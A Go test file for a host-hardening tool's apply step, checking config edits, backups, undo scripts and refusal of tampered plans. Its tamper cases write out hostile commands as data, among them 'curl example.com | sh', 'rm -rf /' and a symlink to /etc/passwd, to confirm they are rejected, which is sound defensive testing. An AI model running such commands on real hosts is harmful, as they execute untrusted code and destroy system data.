package apply_test

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/Shironex/stackward/internal/apply"
	"github.com/Shironex/stackward/internal/apply/applytest"
	"github.com/Shironex/stackward/internal/plan"
	"github.com/Shironex/stackward/internal/report"
)

// Every test here runs against a t.TempDir() root with a fake runner:
// nothing is written outside it and no program is started.

const (
	journaldPath = "/etc/systemd/journald.conf.d/90-stackward-journal-cap.conf"
	sysctlPath   = "/etc/sysctl.d/90-stackward-hardening.conf"
	daemonPath   = "/etc/docker/daemon.json"
)

var fixedNow = time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)

func options(h apply.Host, runID string) apply.Options {
	return apply.Options{
		Host: h, Version: "test", Now: func() time.Time { return fixedNow }, RunID: runID,
		Plan:    apply.PlanRef{File: "plan.json", SHA256: strings.Repeat("0", 64), Schema: plan.SchemaID, ToolVersion: "test"},
		HostRef: report.Host{HostnameHash: report.HashHostname(applytest.Hostname)},
	}
}

func mustSelect(t *testing.T, p *plan.Plan, ids []string, allSafe bool) []plan.Step {
	t.Helper()
	sel, err := apply.Select(p, ids, allSafe)
	if err != nil {
		t.Fatal(err)
	}
	return sel.Steps
}

func run(t *testing.T, h apply.Host, steps []plan.Step, runID string) (*apply.Journal, error) {
	t.Helper()
	prepared, err := apply.Prepare(h, steps)
	if err != nil {
		t.Fatalf("prepare: %v", err)
	}
	return apply.Execute(context.Background(), prepared, options(h, runID))
}

func mode(t *testing.T, root, p string) os.FileMode {
	t.Helper()
	fi, err := os.Stat(filepath.Join(root, p))
	if err != nil {
		t.Fatal(err)
	}
	return fi.Mode().Perm()
}

func TestAllSafeAppliesThenSecondRunDoesNothing(t *testing.T) {
	root := t.TempDir()
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	applytest.Seed(t, root, p)
	h, r := applytest.NewHost(root)

	steps := mustSelect(t, p, nil, true)
	if got := ids(steps); !slices.Equal(got, []string{"journald-cap", "sysctl-hardening"}) {
		t.Fatalf("--all-safe selected %v", got)
	}
	j, err := run(t, h, steps, "20260301T120000Z-aaaaaa")
	if err != nil {
		t.Fatal(err)
	}
	if j.Status != apply.RunOK {
		t.Fatalf("status %s", j.Status)
	}
	for _, s := range steps {
		got, ok := applytest.Read(t, root, s.Edits[0].Path)
		if !ok || got != s.Edits[0].New {
			t.Errorf("%s: %q", s.Edits[0].Path, got)
		}
		if m := mode(t, root, s.Edits[0].Path); m != 0o644 {
			t.Errorf("%s mode %o", s.Edits[0].Path, m)
		}
	}
	wantCalls := [][]string{{"systemctl", "restart", "systemd-journald"}, {"sysctl", "-p", sysctlPath}}
	if !slices.EqualFunc(r.Calls(), wantCalls, slices.Equal) {
		t.Errorf("commands %v, want %v", r.Calls(), wantCalls)
	}
	if v, _ := applytest.Read(t, root, "/proc/sys/kernel/kptr_restrict"); v != "1\n" {
		t.Errorf("running value %q", v)
	}
	// Created files have no backup and no .orig.
	if _, ok := applytest.Read(t, root, journaldPath+".orig"); ok {
		t.Error("a created file got a .orig")
	}
	saved, err := apply.LoadJournal(h, j.RunID)
	if err != nil || saved.Status != apply.RunOK {
		t.Fatalf("journal on disk: %v %+v", err, saved)
	}
	if m := mode(t, root, apply.JournalPath(j.RunID)); m != 0o600 {
		t.Errorf("journal mode %o", m)
	}
	if m := mode(t, root, apply.RunDir(j.RunID)); m != 0o700 {
		t.Errorf("run dir mode %o", m)
	}

	// Second run: every step is already applied, nothing runs.
	r.Reset()
	prepared, err := apply.Prepare(h, steps)
	if err != nil {
		t.Fatal(err)
	}
	if n := apply.ToRun(prepared); n != 0 {
		t.Errorf("second run would apply %d steps: %+v", n, prepared)
	}
	for _, pr := range prepared {
		if pr.Why == "" {
			t.Errorf("%s: already applied without a reason", pr.Step.ID)
		}
	}
	if len(r.Calls()) != 0 {
		t.Errorf("the checks ran commands: %v", r.Calls())
	}
}

func TestSysctlFileInPlaceButValuesOffReloads(t *testing.T) {
	root := t.TempDir()
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	applytest.Seed(t, root, p)
	s := applytest.Step(t, p, "sysctl-hardening")
	applytest.Write(t, root, sysctlPath, s.Edits[0].New, 0o644)
	h, r := applytest.NewHost(root)

	j, err := run(t, h, []plan.Step{s}, "20260301T120000Z-bbbbbb")
	if err != nil {
		t.Fatal(err)
	}
	if f := j.Steps[0].Files[0]; f.Changed {
		t.Error("a file that already held the new content was rewritten")
	}
	if want := [][]string{{"sysctl", "-p", sysctlPath}}; !slices.EqualFunc(r.Calls(), want, slices.Equal) {
		t.Errorf("commands %v", r.Calls())
	}
}

func TestDockerReplaceKeepsOrigBackupModeAndValidates(t *testing.T) {
	root := t.TempDir()
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	applytest.Seed(t, root, p)
	s := applytest.Step(t, p, "docker-log-rotation")
	if err := os.Chmod(filepath.Join(root, daemonPath), 0o640); err != nil {
		t.Fatal(err)
	}
	h, r := applytest.NewHost(root)

	steps := mustSelect(t, p, []string{"docker-log-rotation"}, false)
	j, err := run(t, h, steps, "20260301T120000Z-cccccc")
	if err != nil {
		t.Fatal(err)
	}
	e := s.Edits[0]
	if got, _ := applytest.Read(t, root, daemonPath); got != e.New {
		t.Errorf("daemon.json %q", got)
	}
	if m := mode(t, root, daemonPath); m != 0o640 {
		t.Errorf("replaced file mode %o, want its own 0640", m)
	}
	if got, _ := applytest.Read(t, root, daemonPath+".orig"); got != e.Old {
		t.Errorf(".orig %q", got)
	}
	backup := apply.BackupPath(j.RunID, daemonPath)
	if got, _ := applytest.Read(t, root, backup); got != e.Old {
		t.Errorf("backup %q", got)
	}
	if m := mode(t, root, backup); m != 0o640 {
		t.Errorf("backup mode %o", m)
	}
	calls := r.Calls()
	if len(calls) != 2 || !slices.Equal(calls[0][:3], []string{"dockerd", "--validate", "--config-file"}) || !slices.Equal(calls[1], []string{"systemctl", "restart", "docker"}) {
		t.Fatalf("commands %v", calls)
	}
	if staged := calls[0][3]; filepath.Dir(staged) != filepath.Join(root, "etc", "docker") {
		t.Errorf("staged file %s is not next to daemon.json", staged)
	}
	f := j.Steps[0].Files[0]
	if !f.Changed || !f.OrigCreated || f.Backup != backup || f.Mode != "0640" {
		t.Errorf("journal file %+v", f)
	}
	if kinds := []string{j.Steps[0].Commands[0].Kind, j.Steps[0].Commands[1].Kind}; !slices.Equal(kinds, []string{apply.KindValidate, apply.KindCommand}) {
		t.Errorf("command kinds %v", kinds)
	}

	// A second run restarts nothing.
	r.Reset()
	prepared, err := apply.Prepare(h, steps)
	if err != nil || apply.ToRun(prepared) != 0 || len(r.Calls()) != 0 {
		t.Errorf("second run: %v %+v %v", err, prepared, r.Calls())
	}
}

func TestOrigIsWrittenOnceAndNeverReplaced(t *testing.T) {
	root := t.TempDir()
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	applytest.Seed(t, root, p)
	applytest.Write(t, root, daemonPath+".orig", "the first original\n", 0o600)
	h, _ := applytest.NewHost(root)

	j, err := run(t, h, mustSelect(t, p, []string{"docker-log-rotation"}, false), "20260301T120000Z-dddddd")
	if err != nil {
		t.Fatal(err)
	}
	if got, _ := applytest.Read(t, root, daemonPath+".orig"); got != "the first original\n" {
		t.Errorf(".orig was replaced: %q", got)
	}
	if f := j.Steps[0].Files[0]; f.OrigCreated || f.Orig != daemonPath+".orig" {
		t.Errorf("journal file %+v", f)
	}
}

func TestValidationFailureLeavesTheFileUntouched(t *testing.T) {
	root := t.TempDir()
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	applytest.Seed(t, root, p)
	h, r := applytest.NewHost(root)
	r.Exit["dockerd"] = 1
	s := applytest.Step(t, p, "docker-log-rotation")

	j, err := run(t, h, []plan.Step{s}, "20260301T120000Z-eeeeee")
	if err == nil || !strings.Contains(err.Error(), "failed validation") {
		t.Fatalf("err %v", err)
	}
	if got, _ := applytest.Read(t, root, daemonPath); got != s.Edits[0].Old {
		t.Errorf("daemon.json changed: %q", got)
	}
	entries, _ := os.ReadDir(filepath.Join(root, "etc", "docker"))
	for _, e := range entries {
		if strings.Contains(e.Name(), "stackward") {
			t.Errorf("staged file left behind: %s", e.Name())
		}
	}
	if j.Status != apply.RunFailed || j.Steps[0].Status != apply.StepFailed || j.Error == "" {
		t.Errorf("journal %+v", j)
	}
	if c := j.Steps[0].Commands; len(c) != 1 || c[0].ExitCode != 1 || c[0].Kind != apply.KindValidate {
		t.Errorf("commands %+v", c)
	}
	for _, c := range r.Calls() {
		if c[0] == "systemctl" {
			t.Error("docker was restarted after a failed validation")
		}
	}
	if lines := apply.UndoScript(j); len(lines) != 0 {
		t.Errorf("nothing changed, yet the undo says %v", lines)
	}
}

func TestFailureStopsTheRunAndPrintsTheUndo(t *testing.T) {
	root := t.TempDir()
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	applytest.Seed(t, root, p)
	h, r := applytest.NewHost(root)
	r.Exit["systemctl"] = 3

	j, err := run(t, h, mustSelect(t, p, nil, true), "20260301T120000Z-ffffff")
	if err == nil {
		t.Fatal("a failing restart did not fail the run")
	}
	if j.Steps[0].Status != apply.StepFailed || j.Steps[1].Status != apply.StepNotRun {
		t.Errorf("statuses %s %s", j.Steps[0].Status, j.Steps[1].Status)
	}
	if _, ok := applytest.Read(t, root, sysctlPath); ok {
		t.Error("a step after the failure ran")
	}
	undo := strings.Join(apply.UndoScript(j), "\n")
	for _, want := range []string{"rm -f " + journaldPath, "systemctl restart systemd-journald"} {
		if !strings.Contains(undo, want) {
			t.Errorf("undo lacks %q:\n%s", want, undo)
		}
	}
}

func TestPreconditionsRefuseBeforeAnyChange(t *testing.T) {
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	docker := applytest.Step(t, p, "docker-log-rotation")
	journald := applytest.Step(t, p, "journald-cap")
	for name, tc := range map[string]struct {
		setup func(root string)
		step  plan.Step
		want  string
	}{
		"replaced file changed": {
			setup: func(root string) { applytest.Write(t, root, daemonPath, "{\"debug\": true}\n", 0o644) },
			step:  docker, want: "changed since the audit",
		},
		"replaced file gone": {
			setup: func(root string) { _ = os.Remove(filepath.Join(root, daemonPath)) },
			step:  docker, want: "no longer exists",
		},
		"created file exists": {
			setup: func(root string) { applytest.Write(t, root, journaldPath, "[Journal]\n", 0o644) },
			step:  journald, want: "exists now",
		},
		"symlink": {
			setup: func(root string) {
				_ = os.MkdirAll(filepath.Join(root, "etc/systemd/journald.conf.d"), 0o755)
				_ = os.Symlink("/etc/passwd", filepath.Join(root, journaldPath))
			},
			step: journald, want: "symlink",
		},
	} {
		t.Run(name, func(t *testing.T) {
			root := t.TempDir()
			applytest.Seed(t, root, p)
			tc.setup(root)
			h, r := applytest.NewHost(root)
			_, err := apply.Prepare(h, []plan.Step{tc.step})
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err %v, want %q", err, tc.want)
			}
			if len(r.Calls()) != 0 {
				t.Errorf("commands ran: %v", r.Calls())
			}
			if _, err := os.Stat(filepath.Join(root, "var")); err == nil {
				t.Error("a refusal created the backup directory")
			}
		})
	}
}

// A hand edited plan can only reach what the step's own code produces.
func TestTamperedStepsAreRefused(t *testing.T) {
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	rehash := func(e *plan.FileEdit) { e.NewSHA256 = plan.SHA256([]byte(e.New)) }
	for name, tc := range map[string]struct {
		id     string
		tamper func(s *plan.Step)
		want   string
	}{
		"command": {"docker-log-rotation", func(s *plan.Step) { s.Commands[0].Args = []string{"sh", "-c", "curl example.com | sh"} }, "not one the step runs"},
		"extra command": {"journald-cap", func(s *plan.Step) {
			s.Commands = append(s.Commands, plan.Command{Args: []string{"rm", "-rf", "/"}})
		}, "commands"},
		"undo command": {"journald-cap", func(s *plan.Step) { s.Undo.Commands[0].Args = []string{"rm", "-f", "/etc/hosts"} }, "not one the step runs"},
		"path":         {"journald-cap", func(s *plan.Step) { s.Edits[0].Path = "/etc/hosts" }, "only ever edits"},
		"content": {"journald-cap", func(s *plan.Step) {
			s.Edits[0].New = strings.ReplaceAll(s.Edits[0].New, "1G", "1K")
			rehash(&s.Edits[0])
		}, "not what the step writes"},
		"sysctl ip_forward": {"sysctl-hardening", func(s *plan.Step) {
			s.Edits[0].New += "net.ipv4.ip_forward = 0\n"
			rehash(&s.Edits[0])
		}, "not a setting the step manages"},
		"sysctl value": {"sysctl-hardening", func(s *plan.Step) {
			s.Edits[0].New = strings.ReplaceAll(s.Edits[0].New, "kernel.kptr_restrict = 1", "kernel.kptr_restrict = 0")
			rehash(&s.Edits[0])
		}, "only ever sets"},
		"docker content": {"docker-log-rotation", func(s *plan.Step) {
			s.Edits[0].New = strings.Replace(s.Edits[0].New, "{", "{\n  \"iptables\": false,", 1)
			rehash(&s.Edits[0])
		}, "not what the step writes"},
		"validate":   {"docker-log-rotation", func(s *plan.Step) { s.Edits[0].Validate = []string{"sh", "-c"} }, "validate command"},
		"risk":       {"docker-log-rotation", func(s *plan.Step) { s.Risk, s.OptIn = plan.Safe, false }, "differs"},
		"restarts":   {"journald-cap", func(s *plan.Step) { s.Restarts = nil }, "restarts"},
		"redacted":   {"docker-log-rotation", func(s *plan.Step) { s.Edits[0].Redacted = true }, "redacted"},
		"unknown id": {"journald-cap", func(s *plan.Step) { s.ID = "make-coffee" }, "not a known step"},
		// The never touched list is judged again at apply time, before the
		// generator's own rules, from the touches, the edits and the
		// commands, so dropping a target from touches does not help.
		"never touched target": {"docker-log-rotation", func(s *plan.Step) { s.Touches = append(s.Touches, "docker-daemon:iptables") }, "never touched: docker-log-rotation reaches docker-daemon:iptables"},
		"never touched path": {"journald-cap", func(s *plan.Step) {
			s.Touches, s.Edits[0].Path = nil, "/etc/netplan/50-cloud-init.yaml"
		}, "never touched: journald-cap reaches file:/etc/netplan/50-cloud-init.yaml"},
		"never touched command": {"sysctl-hardening", func(s *plan.Step) {
			s.Commands = append(s.Commands, plan.Command{Args: []string{"sysctl", "-w", "net.ipv4.ip_forward=0"}})
		}, "never touched: sysctl-hardening reaches cmd:sysctl:net.ipv4.ip_forward=0"},
	} {
		t.Run(name, func(t *testing.T) {
			s := applytest.Step(t, p, tc.id)
			s = clone(s)
			tc.tamper(&s)
			root := t.TempDir()
			applytest.Seed(t, root, p)
			h, r := applytest.NewHost(root)
			_, err := apply.Prepare(h, []plan.Step{s})
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err %v, want %q", err, tc.want)
			}
			if len(r.Calls()) != 0 {
				t.Errorf("commands ran: %v", r.Calls())
			}
		})
	}
	// The untouched steps pass.
	for _, s := range p.Steps {
		if err := plan.Authorize(s); err != nil {
			t.Errorf("%s: %v", s.ID, err)
		}
	}
	created := applytest.FixturePlan(t, "plan-docker-new-daemon-json")
	if err := plan.Authorize(created.Steps[0]); err != nil {
		t.Errorf("docker create: %v", err)
	}
}

func clone(s plan.Step) plan.Step {
	s.Edits = slices.Clone(s.Edits)
	for i := range s.Edits {
		s.Edits[i].Validate = slices.Clone(s.Edits[i].Validate)
	}
	s.Before = slices.Clone(s.Before)
	for i := range s.Before {
		s.Before[i].Args = slices.Clone(s.Before[i].Args)
	}
	s.Commands = slices.Clone(s.Commands)
	for i := range s.Commands {
		s.Commands[i].Args = slices.Clone(s.Commands[i].Args)
	}
	s.Undo.Commands = slices.Clone(s.Undo.Commands)
	for i := range s.Undo.Commands {
		s.Undo.Commands[i].Args = slices.Clone(s.Undo.Commands[i].Args)
	}
	s.Restarts = slices.Clone(s.Restarts)
	return s
}

func ids(steps []plan.Step) []string {
	out := make([]string, len(steps))
	for i, s := range steps {
		out[i] = s.ID
	}
	return out
}

func TestSysctlUndoValueIsPinnedToTheRunningValue(t *testing.T) {
	p := applytest.FixturePlan(t, "plan-host-settings-fix")
	for name, tc := range map[string]struct {
		tamper func(s *plan.Step)
		want   string
	}{
		"another value": {func(s *plan.Step) {
			s.Undo.Commands[3].Args = []string{"sysctl", "-w", "kernel.kptr_restrict=2"}
		}, "undo restores kernel.kptr_restrict to 2 but it is 0"},
		"changed since the audit": {func(*plan.Step) {}, "undo restores net.ipv4.conf.all.rp_filter to 1 but it is 0"},
	} {
		t.Run(name, func(t *testing.T) {
			s := clone(applytest.Step(t, p, "sysctl-hardening"))
			tc.tamper(&s)
			root := t.TempDir()
			applytest.Seed(t, root, p)
			if name == "changed since the audit" {
				applytest.Write(t, root, "/proc/sys/net/ipv4/conf/all/rp_filter", "0\n", 0o644)
			}
			h, r := applytest.NewHost(root)
			// Authorize alone accepts a numeric value; the pin refuses it.
			if err := plan.Authorize(s); err != nil {
				t.Fatalf("authorize: %v", err)
			}
			_, err := apply.Prepare(h, []plan.Step{s})
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err %v, want %q", err, tc.want)
			}
			if len(r.Calls()) != 0 {
				t.Errorf("commands ran: %v", r.Calls())
			}
		})
	}
	// The untouched plan passes against the host it was made for.
	root := t.TempDir()
	applytest.Seed(t, root, p)
	h, _ := applytest.NewHost(root)
	if _, err := apply.Prepare(h, []plan.Step{applytest.Step(t, p, "sysctl-hardening")}); err != nil {
		t.Fatal(err)
	}
}
